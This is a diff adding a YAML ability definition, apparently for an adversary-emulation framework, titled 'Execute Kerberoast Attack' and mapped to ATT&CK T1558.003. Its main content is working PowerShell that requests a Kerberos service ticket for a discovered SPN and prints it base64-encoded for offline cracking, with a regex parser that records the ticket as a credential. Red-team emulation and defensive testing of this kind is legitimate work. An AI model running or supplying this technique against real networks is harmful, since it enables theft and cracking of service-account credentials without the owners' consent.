@@ -1,0 +1,28 @@
+- id: 981a8779-a793-4ba3-87b8-93649788e0f9
+  name: Execute Kerberoast Attack
+  description: Requests a Kerberos service ticket (TGS) for a previously discovered SPN and extracts the ticket for offline cracking.
+  tactic: credential-access
+  technique:
+    attack_id: T1558.003
+    name: "Kerberoasting"
+  requirements:
+    - plugins.stockpile.app.requirements.existential:
+      - source: host.spn.value
+  platforms:
+    windows:
+      psh:
+        command: |
+          Add-Type -AssemblyName System.IdentityModel;
+          try {
+              $secToken = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "#{host.spn.value}";
+              $ticket = [System.Convert]::ToBase64String($secToken.GetRequest());
+              Write-Host "KerberosTicket: $($ticket)";
+          } catch {
+              Write-Error "Failed to get Kerberos ticket: $($_.Exception.Message)";
+          }
+        parsers:
+          plugins.adversary_emulation.app.parsers.regex_parser:
+            - source: 'credential.kerberos.tgs.base64'
+              custom_parser_vals:
+                regex: 'KerberosTicket:\s*(.*)'
+                edge_label: 'is_kerberos_tgs'
